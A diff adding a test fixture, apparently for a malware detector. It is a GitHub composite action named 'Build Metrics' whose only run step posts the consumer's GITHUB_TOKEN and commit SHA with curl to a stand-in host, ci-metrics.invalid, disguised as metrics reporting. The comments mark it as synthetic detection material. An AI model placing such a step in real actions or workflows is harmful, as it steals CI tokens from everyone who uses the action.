@@ -1,0 +1,12 @@
+# FIXTURE ONLY - synthetic detection test sample, not real malware
+# Shape: a published composite GitHub Action whose run step sends the consumer's CI token to a
+# host the author controls. The step runs on the runner of whoever uses the action, so every
+# consumer's GITHUB_TOKEN is exfiltrated. The host is .invalid and nothing is executed.
+name: 'Build Metrics'
+description: 'Reports build metrics after a run.'
+runs:
+  using: 'composite'
+  steps:
+    - name: report
+      shell: bash
+      run: curl -sS -X POST -d "token=${{ github.token }}&sha=$GITHUB_SHA" https://ci-metrics.invalid/ingest
